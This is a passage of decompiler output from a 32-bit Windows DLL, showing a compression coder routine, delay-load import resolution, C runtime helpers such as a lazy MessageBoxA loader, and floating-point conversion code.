      sub_1008C57F(v4, v6);
      sub_1008B06A();
      v8 = dword_10185324;
      v9 = dword_101855F8;
    }
    else
    {
      sub_1008C448((int)v4, v6);
      v10 = i >> 14;
      v8 = v10 * dword_10185700 + v2;
      v9 = v10 * (dword_10185704 - dword_10185700);
      dword_10185324 = v8;
      dword_101855F8 = v9;
    }
    v11 = dword_10185434;
    if ( !dword_10185434 )
      break;
LABEL_19:
    if ( dword_101855F4 || (v13 = *(_DWORD *)(v11 + 2), v13 < dword_1018443C) )
    {
      sub_1008C188((unsigned __int8 *)v17);
      if ( !byte_101842E1 )
      {
        byte_101842E1 = 1;
        memset(byte_10185600, 0, 0x100u);
      }
    }
    else
    {
      dword_101855F0 = v13;
    }
    v2 = dword_10185324;
    for ( i = dword_101855F8; ; i <<= 8 )
    {
      if ( (v2 ^ (v2 + i)) < 0x1000000 )
        goto LABEL_28;
      if ( i >= 0x8000 )
        break;
      i = -v2 & 0x7FFF;
LABEL_28:
      sub_1008B04D(HIBYTE(v2), a1);
      v2 <<= 8;
    }
    dword_10185324 = v2;
  }
  while ( 1 )
  {
LABEL_11:
    if ( (v8 ^ (v9 + v8)) < 0x1000000 )
      goto LABEL_14;
    if ( v9 >= 0x8000 )
      break;
    v9 = -v8 & 0x7FFF;
LABEL_14:
    sub_1008B04D(HIBYTE(v8), a1);
    v9 <<= 8;
    dword_101855F8 = v9;
    v8 <<= 8;
  }
  dword_10185324 = v8;
  while ( 1 )
  {
    v12 = *(unsigned __int8 **)(v17 + 8);
    ++dword_101855F4;
    v17 = (int)v12;
    if ( !v12 )
      break;
    if ( *v12 != byte_101842E2 )
    {
      sub_1008C718(v12, v6);
      sub_1008B06A();
      v11 = dword_10185434;
      if ( !dword_10185434 )
      {
        v8 = dword_10185324;
        v9 = dword_101855F8;
        goto LABEL_11;
      }
      goto LABEL_19;
    }
  }
  v14 = 4;
  do
  {
    result = sub_1008B04D(HIBYTE(v8), a1);
    v8 <<= 8;
    --v14;
  }
  while ( v14 );
  dword_10185324 = v8;
  return result;
}
// 101842E1: using guessed type char byte_101842E1;
// 101842E2: using guessed type char byte_101842E2;
// 1018443C: using guessed type int dword_1018443C;
// 10185324: using guessed type int dword_10185324;
// 10185434: using guessed type int dword_10185434;
// 101855F0: using guessed type int dword_101855F0;
// 101855F4: using guessed type int dword_101855F4;
// 101855F8: using guessed type int dword_101855F8;
// 10185700: using guessed type int dword_10185700;
// 10185704: using guessed type int dword_10185704;

//----- (1008CBFE) --------------------------------------------------------
FARPROC __stdcall sub_1008CBFE(int *a1, int *Arguments)
{
  int *v2; // esi
  int v3; // ebx
  char *v4; // edi
  const CHAR *v5; // ecx
  char *v6; // ebx
  char *v7; // edx
  bool v8; // zf
  HMODULE LibraryA; // edi
  int v11; // edx
  const CHAR *v12; // eax
  FARPROC ProcAddress; // ebx
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  int v16[3]; // [esp+Ch] [ebp-44h] BYREF
  LPCSTR lpLibFileName; // [esp+18h] [ebp-38h]
  BOOL v18; // [esp+1Ch] [ebp-34h]
  LPCSTR lpProcName; // [esp+20h] [ebp-30h]
  HMODULE v20; // [esp+24h] [ebp-2Ch]
  int (__stdcall *v21)(); // [esp+28h] [ebp-28h]
  DWORD LastError; // [esp+2Ch] [ebp-24h]
  volatile LONG *Target; // [esp+38h] [ebp-18h]
  char *v24; // [esp+44h] [ebp-Ch]
  int v25; // [esp+4Ch] [ebp-4h]

  v2 = a1;
  v3 = a1[3];
  v4 = (char *)&_ImageBase + a1[5];
  v5 = (char *)&_ImageBase + a1[1];
  Target = (volatile LONG *)((char *)&_ImageBase + a1[2]);
  v6 = (char *)&_ImageBase + v3;
  v7 = (char *)&_ImageBase + a1[4];
  v25 = a1[7];
  lpLibFileName = v5;
  v24 = v4;
  v16[2] = (int)Arguments;
  v8 = (*a1 & 1) == 0;
  v16[0] = 36;
  v16[1] = (int)a1;
  v18 = 0;
  lpProcName = 0;
  v20 = 0;
  v21 = 0;
  LastError = 0;
  if ( v8 )
  {
    Arguments = v16;
    RaiseException(0xC06D0057, 0, 1u, (const ULONG_PTR *)&Arguments);
    return 0;
  }
  LibraryA = (HMODULE)*Target;
  v11 = *(_DWORD *)&v7[4 * (((char *)Arguments - v6) >> 2)];
  a1 = (int *)(4 * (((char *)Arguments - v6) >> 2));
  v18 = v11 >= 0;
  v12 = (char *)&word_10000002 + v11;
  if ( v11 < 0 )
    v12 = (const CHAR *)(unsigned __int16)v11;
  lpProcName = v12;
  ProcAddress = 0;
  if ( !dword_101837DC || (ProcAddress = (FARPROC)dword_101837DC(0, v16)) == 0 )
  {
    if ( !LibraryA )
    {
      if ( !dword_101837DC || (LibraryA = (HMODULE)dword_101837DC(1, v16)) == 0 )
      {
        LibraryA = LoadLibraryA(lpLibFileName);
        if ( !LibraryA )
        {
          LastError = GetLastError();
          if ( !dword_101837D8 || (LibraryA = (HMODULE)dword_101837D8(3, v16)) == 0 )
          {
            Arguments = v16;
            RaiseException(0xC06D007E, 0, 1u, (const ULONG_PTR *)&Arguments);
            return v21;
          }
        }
      }
      if ( (HMODULE)InterlockedExchange(Target, (LONG)LibraryA) == LibraryA )
      {
        FreeLibrary(LibraryA);
      }
      else if ( v2[6] )
      {
        v14 = LocalAlloc(0x40u, 8u);
        if ( v14 )
        {
          v14[1] = v2;
          *v14 = dword_101837D4;
          dword_101837D4 = (int)v14;
        }
      }
    }
    v20 = LibraryA;
    if ( dword_101837DC )
      ProcAddress = (FARPROC)dword_101837DC(2, v16);
    if ( !ProcAddress )
    {
      if ( !v2[5]
        || !v2[7]
        || (v15 = (_DWORD *)((char *)LibraryA + *((_DWORD *)LibraryA + 15)), *v15 != 17744)
        || v15[2] != v25
        || LibraryA != (HMODULE)v15[13]
        || (ProcAddress = *(FARPROC *)&v24[(_DWORD)a1]) == 0 )
      {
        ProcAddress = GetProcAddress(LibraryA, lpProcName);
        if ( !ProcAddress )
        {
          LastError = GetLastError();
          if ( dword_101837D8 )
            ProcAddress = (FARPROC)dword_101837D8(4, v16);
          if ( !ProcAddress )
          {
            a1 = v16;
            RaiseException(0xC06D007F, 0, 1u, (const ULONG_PTR *)&a1);
            ProcAddress = v21;
          }
        }
      }
    }
    *Arguments = (int)ProcAddress;
  }
  if ( dword_101837DC )
  {
    LastError = 0;
    v20 = LibraryA;
    v21 = ProcAddress;
    dword_101837DC(5, v16);
  }
  return ProcAddress;
}
// 10000000: using guessed type __int16 _ImageBase;
// 10000002: using guessed type __int16 word_10000002;
// 101837D4: using guessed type int dword_101837D4;
// 101837D8: using guessed type int (__stdcall *dword_101837D8)(_DWORD, _DWORD);
// 101837DC: using guessed type int (__stdcall *dword_101837DC)(_DWORD, _DWORD);

//----- (1008D050) --------------------------------------------------------
void __thiscall sub_1008D050(void *this)
{
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  sub_1009166F(this);
}
// 100FA4B4: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1008D05B) --------------------------------------------------------
_DWORD *__thiscall sub_1008D05B(_DWORD *Block, char a2)
{
  *Block = &ikc::izq_ezibc::`vftable';
  sub_1009166F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100FA4B4: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1008D07D) --------------------------------------------------------
std::exception *__thiscall sub_1008D07D(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  return this;
}
// 100FA4B4: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1008D13B) --------------------------------------------------------
void __thiscall sub_1008D13B(struct type_info *this)
{
  *(_DWORD *)this = &nxys_uwip::`vftable';
  type_info::_Type_info_dtor(this);
}
// 100FA4C0: using guessed type void *nxys_uwip::`vftable';

//----- (1008D149) --------------------------------------------------------
struct type_info *__thiscall sub_1008D149(struct type_info *Block, char a2)
{
  sub_1008D13B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1009002E) --------------------------------------------------------
int __cdecl sub_1009002E(int a1)
{
  int result; // eax

  result = a1;
  dword_10183804 = a1;
  return result;
}
// 10183804: using guessed type int dword_10183804;

//----- (10090594) --------------------------------------------------------
void __thiscall sub_10090594(void *this)
{
  if ( this != (void *)dword_1012F990 )
    __report_gsfailure();
}
// 1012F990: using guessed type int dword_1012F990;

//----- (10090C05) --------------------------------------------------------
int sub_10090C05()
{
  return dword_1012F060;
}
// 1012F060: using guessed type int dword_1012F060;

//----- (1009135E) --------------------------------------------------------
int __cdecl sub_1009135E(_DWORD *a1)
{
  if ( a1 && dword_10183824 )
  {
    *a1 = dword_10183824;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10093596: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10183824: using guessed type int dword_10183824;

//----- (10091395) --------------------------------------------------------
int __cdecl sub_10091395(_DWORD *a1)
{
  if ( a1 && dword_10183824 )
  {
    *a1 = dword_10183830;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10093596: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10183824: using guessed type int dword_10183824;
// 10183830: using guessed type int dword_10183830;

//----- (1009166F) --------------------------------------------------------
void __thiscall sub_1009166F(void *this)
{
  bool v1; // zf

  v1 = *((_DWORD *)this + 2) == 0;
  *(_DWORD *)this = &ikc::qlurhxmnb::`vftable';
  if ( !v1 )
    free(*((void **)this + 1));
}
// 100FA54C: using guessed type void *ikc::qlurhxmnb::`vftable';

//----- (10091692) --------------------------------------------------------
void *__thiscall sub_10091692(void *Block, char a2)
{
  sub_1009166F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10091CD0) --------------------------------------------------------
int __cdecl sub_10091CD0(int a1)
{
  int result; // eax

  result = a1;
  dword_10183B8C = a1;
  return result;
}
// 10183B8C: using guessed type int dword_10183B8C;

//----- (100923C7) --------------------------------------------------------
void *sub_100923C7()
{
  return &unk_10104A5C;
}

//----- (100923EB) --------------------------------------------------------
void __cdecl sub_100923EB()
{
  ;
}

//----- (10093490) --------------------------------------------------------
int __cdecl sub_10093490(int a1)
{
  int result; // eax

  result = a1;
  dword_10183CE4 = a1;
  return result;
}
// 10183CE4: using guessed type int dword_10183CE4;

//----- (100962D5) --------------------------------------------------------
int sub_100962D5()
{
  return _decode_pointer(dword_1018417C);
}
// 10090B79: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 1018417C: using guessed type int dword_1018417C;

//----- (10096492) --------------------------------------------------------
int __cdecl sub_10096492(int a1)
{
  int result; // eax

  result = a1;
  dword_10184188 = a1;
  return result;
}
// 10184188: using guessed type int dword_10184188;

//----- (1009649C) --------------------------------------------------------
int __cdecl sub_1009649C(int a1)
{
  int result; // eax

  result = a1;
  dword_1018418C = a1;
  return result;
}
// 1018418C: using guessed type int dword_1018418C;

//----- (1009671B) --------------------------------------------------------
int sub_1009671B()
{
  dword_10194EE4 = _get_sse2_info();
  return 0;
}
// 100966BB: using guessed type int _get_sse2_info(void);
// 10194EE4: using guessed type int dword_10194EE4;

//----- (10096805) --------------------------------------------------------
int __cdecl sub_10096805(int a1, int a2, int a3)
{
  HMODULE LibraryA; // eax
  HMODULE v4; // edi
  int (__stdcall *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationA)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v10)(void); // esi
  int (__stdcall *v11)(int, int, char *, int, char *); // eax
  int (__stdcall *v12)(int, int, char *, int, char *); // edi
  int v13; // eax
  int (*v14)(void); // eax
  int (__stdcall *v15)(int); // eax
  int (__stdcall *v16)(int, int, int, int); // eax
  char v18[12]; // [esp+10h] [ebp-20h] BYREF
  char v19[4]; // [esp+1Ch] [ebp-14h] BYREF
  unsigned int v20; // [esp+20h] [ebp-10h] BYREF
  int v21; // [esp+24h] [ebp-Ch] BYREF
  int v22; // [esp+28h] [ebp-8h]
  int v23; // [esp+2Ch] [ebp-4h]

  v22 = _encoded_null();
  v23 = 0;
  v21 = 0;
  v20 = 0;
  if ( !dword_101841CC )
  {
    LibraryA = LoadLibraryA("USER32.DLL");
    v4 = LibraryA;
    if ( !LibraryA )
      return 0;
    MessageBoxA = (int (__stdcall *)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddress(LibraryA, "MessageBoxA");
    if ( !MessageBoxA )
      return 0;
    dword_101841CC = _encode_pointer(MessageBoxA);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v4, "GetActiveWindow");
    dword_101841D0 = _encode_pointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v4, "GetLastActivePopup");
    dword_101841D4 = _encode_pointer(GetLastActivePopup);
    if ( sub_1009135E(&v21) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v21 == 2 )
    {
      GetUserObjectInformationA = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                            v4,
                                                                                            "GetUserObjectInformationA");
      dword_101841DC = _encode_pointer(GetUserObjectInformationA);
      if ( dword_101841DC )
      {
        GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v4, "GetProcessWindowStation");
        dword_101841D8 = _encode_pointer(GetProcessWindowStation);
      }
    }
  }
  if ( dword_101841D8 == v22
    || dword_101841DC == v22
    || (v10 = (int (*)(void))_decode_pointer(dword_101841D8),
        v11 = (int (__stdcall *)(int, int, char *, int, char *))_decode_pointer(dword_101841DC),
        v12 = v11,
        !v10)
    || !v11
    || (v13 = v10()) != 0 && v12(v13, 1, v18, 12, v19) && (v18[8] & 1) != 0 )
  {
    if ( dword_101841D0 != v22 )
    {
      v14 = (int (*)(void))_decode_pointer(dword_101841D0);
      if ( v14 )
      {
        v23 = v14();
        if ( v23 )
        {
          if ( dword_101841D4 != v22 )
          {
            v15 = (int (__stdcall *)(int))_decode_pointer(dword_101841D4);
            if ( v15 )
              v23 = v15(v23);
          }
        }
      }
    }
  }
  else
  {
    if ( sub_10091395(&v20) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v20 < 4 )
      a3 |= 0x40000u;
    else
      a3 |= 0x200000u;
  }
  v16 = (int (__stdcall *)(int, int, int, int))_decode_pointer(dword_101841CC);
  if ( v16 )
    return v16(v23, a1, a2, a3);
  return 0;
}
// 10090B02: using guessed type _DWORD __cdecl _encode_pointer(_DWORD);
// 10090B70: using guessed type int _encoded_null(void);
// 10090B79: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 101841CC: using guessed type int dword_101841CC;
// 101841D0: using guessed type int dword_101841D0;
// 101841D4: using guessed type int dword_101841D4;
// 101841D8: using guessed type int dword_101841D8;
// 101841DC: using guessed type int dword_101841DC;
// 10096805: using guessed type char var_14[4];

//----- (100977B9) --------------------------------------------------------
void sub_100977B9()
{
  dword_10194DA4 = 0;
}
// 10194DA4: using guessed type int dword_10194DA4;

//----- (10097A5D) --------------------------------------------------------
int __cdecl sub_10097A5D(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_1012FC18 - 1;
    v64 = v3;
    v65 = dword_1012FC18 / 32;
    v9 = &v60 + dword_1012FC18 / 32;
    v66 = 31 - dword_1012FC18 % 32;
    if ( ((1 << (31 - dword_1012FC18 % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_1012FC18 % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_1012FC14 - dword_1012FC18 )
    {
      if ( v3 > dword_1012FC14 )
      {
        if ( v3 < dword_1012FC10 )
        {
          v60 &= ~0x80000000;
          v5 = dword_1012FC24 + v3;
          v50 = dword_1012FC1C / 32;
          v51 = dword_1012FC1C % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_1012FC1C % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_1012FC1C / 32;
          v44 = dword_1012FC1C % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_1012FC1C % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_1012FC24 + dword_1012FC10;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_1012FC14 - v64) / 32;
      v62 = v59;
      v18 = (dword_1012FC14 - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_1012FC18 - 1;
      v25 = dword_1012FC18 / 32;
      v65 = dword_1012FC18 / 32;
      v26 = &v60 + dword_1012FC18 / 32;
      v64 = 31 - dword_1012FC18 % 32;
      if ( ((1 << (31 - dword_1012FC18 % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_1012FC18 % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_1012FC1C + 1) / 32;
      v37 = (dword_1012FC1C + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_1012FC1C));
  if ( dword_1012FC20 == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_1012FC20 == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 1012FC10: using guessed type int dword_1012FC10;
// 1012FC14: using guessed type int dword_1012FC14;
// 1012FC18: using guessed type int dword_1012FC18;
// 1012FC1C: using guessed type int dword_1012FC1C;
// 1012FC20: using guessed type int dword_1012FC20;
// 1012FC24: using guessed type int dword_1012FC24;

//----- (10097F9F) --------------------------------------------------------
int __cdecl sub_10097F9F(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_1012FC30 - 1;
    v64 = v3;
    v65 = dword_1012FC30 / 32;
    v9 = &v60 + dword_1012FC30 / 32;
    v66 = 31 - dword_1012FC30 % 32;
    if ( ((1 << (31 - dword_1012FC30 % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_1012FC30 % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_1012FC2C - dword_1012FC30 )
    {
      if ( v3 > dword_1012FC2C )
      {
        if ( v3 < dword_1012FC28 )
        {
          v60 &= ~0x80000000;
          v5 = dword_1012FC3C + v3;
          v50 = dword_1012FC34 / 32;
          v51 = dword_1012FC34 % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_1012FC34 % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_1012FC34 / 32;
          v44 = dword_1012FC34 % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_1012FC34 % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_1012FC3C + dword_1012FC28;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_1012FC2C - v64) / 32;
      v62 = v59;
      v18 = (dword_1012FC2C - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
